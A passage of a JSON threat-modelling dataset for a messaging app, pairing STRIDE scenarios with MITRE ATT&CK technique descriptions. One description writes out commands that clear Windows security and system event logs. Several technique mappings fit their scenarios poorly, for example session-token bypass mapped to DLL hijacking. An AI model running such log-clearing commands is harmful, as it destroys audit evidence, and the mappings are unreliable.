                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker bypasses the authentication process by manipulating session tokens.",
            "Assumptions": [
                {
                    "Assumption": "The application\u2019s session token management is flawed.",
                    "Role": "Application",
                    "Condition": "Insecure session handling protocols."
                },
                {
                    "Assumption": "The attacker can obtain or forge session tokens.",
                    "Role": "Attacker",
                    "Condition": "Access to session token generation or transmission."
                },
                {
                    "Assumption": "There are no secondary authentication mechanisms to verify the sessions.",
                    "Role": "Application",
                    "Condition": "Lack of multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to higher privilege functions and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "session token",
                "authentication bypass",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake mobile application that looks identical to the legitimate messaging application to steal users' private keys during the account setup process.",
            "Assumptions": [
                {
                    "Assumption": "Users cannot differentiate between the legitimate and fake application",
                    "Role": "User",
                    "Condition": "Application appearance is mimicked effectively"
                },
                {
                    "Assumption": "The attacker has distributed the fake application",
                    "Role": "Attacker",
                    "Condition": "Distribution via app stores or phishing"
                },
                {
                    "Assumption": "Users might download applications from untrusted sources",
                    "Role": "User",
                    "Condition": "Users are unaware of verification steps"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality due to stolen private keys.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity access",
                "credential access",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker crafts malicious companion desktop applications that prompt for primary device authorization but instead hijack session keys.",
            "Assumptions": [
                {
                    "Assumption": "Users link desktop clients to their primary devices without vetting them",
                    "Role": "User",
                    "Condition": "User trusts the application installation process"
                },
                {
                    "Assumption": "The attacker gains physical or remote access to the desktop client",
                    "Role": "Attacker",
                    "Condition": "Attacker has the capability to install the malicious client"
                },
                {
                    "Assumption": "Users believe the authorization request is legitimate",
                    "Role": "User",
                    "Condition": "Users are not aware of potential security risks"
                }
            ],
            "Potential Impact": "Compromise of both data confidentiality and integrity through session key hijacking.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "session hijacking",
                "mitm",
                "credential abuse"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sets up a fake service provider impersonating the messaging application backend to intercept and decrypt messages.",
            "Assumptions": [
                {
                    "Assumption": "Users fail to notice discrepancies in the service provider URL or certificate",
                    "Role": "User",
                    "Condition": "Lack of careful inspection by users"
                },
                {
                    "Assumption": "The attacker has man-in-the-middle (MITM) capabilities",
                    "Role": "Attacker",
                    "Condition": "Attacker can control network traffic routes"
                },
                {
                    "Assumption": "Users trust the service provider configuration based on appearance",
                    "Role": "User",
                    "Condition": "Lack of awareness of MITM risks"
                }
            ],
            "Potential Impact": "Loss of data confidentiality as intercepted messages are decrypted by the attacker.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "service provider",
                "mitm",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the encrypted SQLite databases stored on the user's device, altering or deleting received messages.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have physical or highly privileged access to the user's device",
                    "Role": "Attacker",
                    "Condition": "Attacker has bypassed initial device security"
                },
                {
                    "Assumption": "SQLite databases are not using sufficiently strong encryption",
                    "Role": "Application",
                    "Condition": "Weak encryption settings or keys"
                },
                {
                    "Assumption": "Users store messages locally with minimal validation of message integrity",
                    "Role": "Application",
                    "Condition": "Lack of message integrity checks"
                }
            ],
            "Potential Impact": "Loss of data integrity and possible data corruption or deletion.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "local access",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the companion desktop clients, which then propagates to the primary device on the next synchronization.",
            "Assumptions": [
                {
                    "Assumption": "Users often synchronize data between their primary and companion devices",
                    "Role": "User",
                    "Condition": "Users use multiple devices frequently"
                },
                {
                    "Assumption": "Desktop clients have vulnerabilities that allow code injection",
                    "Role": "Application",
                    "Condition": "Security flaws in client software"
                },
                {
                    "Assumption": "Synchronization processes do not adequately validate data or code",
                    "Role": "Application",
                    "Condition": "Lack of robust synchronization integrity checks"
                }
            ],
            "Potential Impact": "Data integrity is compromised, and system availability may be affected by malicious code execution.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "synchronization",
                "multidevice"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with access to the service provider could tamper with firmware or application updates, distributing malicious updates.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the service provider\u2019s update distribution system",
                    "Role": "Attacker",
                    "Condition": "Successful breach of the service provider"
                },
                {
                    "Assumption": "Users trust updates from the service provider without additional verification",
                    "Role": "User",
                    "Condition": "Users automatically accept updates"
                },
                {
                    "Assumption": "Application update mechanisms do not include sufficient authenticity checks",
                    "Role": "Application",
                    "Condition": "Weak or missing update validations"
                }
            ],
            "Potential Impact": "End-users might install compromised software, leading to system runtime integrity issues and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "update distribution",
                "malware deployment",
                "service provider"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent a sensitive message due to lack of proper logging and accountability mechanisms within the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The application does not maintain robust logging or problem assets with unique user keys",
                    "Role": "Application",
                    "Condition": "Inadequate logging infrastructure"
                },
                {
                    "Assumption": "Disputes are common among users regarding message authenticity",
                    "Role": "User",
                    "Condition": "Frequent communications involving sensitive information"
                },
                {
                    "Assumption": "Users believe that logs or records could undermine their deniability",
                    "Role": "User",
                    "Condition": "Awareness of how logs can be used"
                }
            ],
            "Potential Impact": "The inability to prove message origin damaging trust and potentially causing security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "accountability",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters the logs to cover unauthorized actions, thus challenging the legitimacy of evidence in case of a breach investigation.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a format that allows them to be altered without detection",
                    "Role": "Application",
                    "Condition": "Insecure log storage format"
                },
                {
                    "Assumption": "The attacker has enough privileges to access and modify log files",
                    "Role": "Attacker",
                    "Condition": "Administrative access is obtained"
                },
                {
                    "Assumption": "The application does not implement tamper-evident logging",
                    "Role": "Application",
                    "Condition": "Lack of logging integrity mechanisms"
                }
            ],
            "Potential Impact": "Loss of data integrity, compromising the ability to conduct accurate forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "forensic evasion",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user exploits the lack of transaction records in the encryption key distribution process, thus denying the deletion of keys after leaving the messaging service.",
            "Assumptions": [
                {
                    "Assumption": "Key distribution and revocation records are not maintained properly",
                    "Role": "Application",
                    "Condition": "Insufficient key management processes"
                },
                {
                    "Assumption": "Departing users do not check for proper key revocation",
                    "Role": "User",
                    "Condition": "Users assume keys are automatically handled"
                },
                {
                    "Assumption": "There are no protocols ensuring complete key removal post exit",
                    "Role": "Application",
                    "Condition": "Weak key lifecycle management"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality if old keys are exploited.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "key management",
                "key revocation",
                "transaction logs"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker captures network traffic between devices to infer communication patterns despite the content being encrypted.",
            "Assumptions": [
                {
                    "Assumption": "An attacker can monitor network traffic without content decryption",
                    "Role": "Attacker",
                    "Condition": "Capabilities to intercept data traffic"
                },
                {
                    "Assumption": "Users rely solely on data encryption without considering metadata",
                    "Role": "User",
                    "Condition": "Overreliance on encryption for privacy"
                },
                {
                    "Assumption": "Messaging application does not adequately obfuscate traffic metadata",
                    "Role": "Application",
                    "Condition": "Lack of metadata protection methods"
                }
            ],
            "Potential Impact": "Potential breach of user confidentiality through pattern-based inferences.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "traffic analysis",
                "network monitoring",
                "metadata"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious insiders at the service provider gain access to encrypted databases and attempt to decrypt sensitive data over time.",
            "Assumptions": [
                {
                    "Assumption": "Service provider staff have access levels to encrypted databases",
                    "Role": "Service Provider",
                    "Condition": "Insufficient internal access controls"
                },
                {
                    "Assumption": "Service providers do not rotate encryption keys regularly",
                    "Role": "Application",
                    "Condition": "Weak key rotation policies"
                },
                {
                    "Assumption": "Encrypted data is stored for periods sufficient for offline decryption attempts",
                    "Role": "Application",
                    "Condition": "Long-term data storage without regular audits"
                }
            ],
            "Potential Impact": "Loss of data confidentiality if decryption succeeds.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "encrypted database",
                "key management"
            ],
            "mitre_technique": {
                "name": "Password Managers",
                "description": "Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",
                "id": "attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21",
                "technique_id": "T1555.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker discovers vulnerabilities in the custom encryption protocols leading to sensitive data exposure.",
            "Assumptions": [
                {
                    "Assumption": "Custom encryption protocols may not have undergone rigorous security testing",
                    "Role": "Application",
                    "Condition": "Limited or no external security audits"
                },
                {
                    "Assumption": "The attacker possesses knowledge of or can discover protocol weaknesses",
                    "Role": "Attacker",
                    "Condition": "Advanced technical capabilities or access to research"
                },
                {
                    "Assumption": "Users trust in the built-in security features without additional validation",
                    "Role": "User",
                    "Condition": "Reliance on provided encryption methods"
                }
            ],
            "Potential Impact": "Data confidentiality is compromised through protocol vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption vulnerability",
                "protocol analysis",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the service with illegitimate requests, causing legitimate users to be unable to access messaging services.",
            "Assumptions": [
                {
                    "Assumption": "The application is exposed to internet traffic without proper rate limiting",
                    "Role": "Application",
                    "Condition": "Lack of defensive measures against floods"
                },
                {
                    "Assumption": "Attackers have the network capacity to generate a large volume of requests",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or high-bandwidth systems"
                },
                {
                    "Assumption": "Users have no alternative methods to access their messaging accounts",
                    "Role": "User",
                    "Condition": "Single point of access reliance"
                }
            ],
            "Potential Impact": "Loss of data availability, disrupting communication channels.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flood",
                "service disruption",
                "ddos"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the backend server software causing crashes or slowdowns, making the service unavailable.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable vulnerabilities are present in the server software",
                    "Role": "Application",
                    "Condition": "Unpatched security flaws"
                },
                {
                    "Assumption": "The attacker is capable of identifying and exploiting these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Technical expertise and scanning capabilities"
                },
                {
                    "Assumption": "Service lacks effective monitoring and automated recovery mechanisms",
                    "Role": "Application",
                    "Condition": "Inadequate incident response setup"
                }
            ],
            "Potential Impact": "Loss of data availability due to service crashes or slow operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "exploitation",
                "server crash",
                "software vulnerability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A compromised companion desktop client starts generating invalid data, consuming server processing resources and affecting legitimate operations.",
            "Assumptions": [
                {
                    "Assumption": "Companion desktop clients have vulnerabilities that allow compromise",
                    "Role": "Application",
                    "Condition": "Weak client-side security measures"
                },
                {
                    "Assumption": "The server processes client data without strict validation mechanisms",
                    "Role": "Application",
                    "Condition": "Insufficient input validation"
                },
                {
                    "Assumption": "Multiple desktop clients working maliciously against a single server",
                    "Role": "Attacker",
                    "Condition": "Coordinated attack through compromised clients"
                }
            ],
            "Potential Impact": "Reduced service availability affecting user communication.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "client compromise",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol to escalate privileges and gain control over the application functions.",
            "Assumptions": [
                {
                    "Assumption": "The application contains protocol vulnerabilities that allow privilege escalation",
                    "Role": "Application",
                    "Condition": "Unpatched encryption protocol flaws"
                },
                {
                    "Assumption": "An attacker can intercept and manipulate protocol exchanges",
                    "Role": "Attacker",
                    "Condition": "MITM capabilities or access to vulnerable network paths"
                },
                {
                    "Assumption": "Existing security mechanisms do not detect or block this type of exploit",
                    "Role": "Application",
                    "Condition": "Inadequate runtime security checks"
                }
            ],
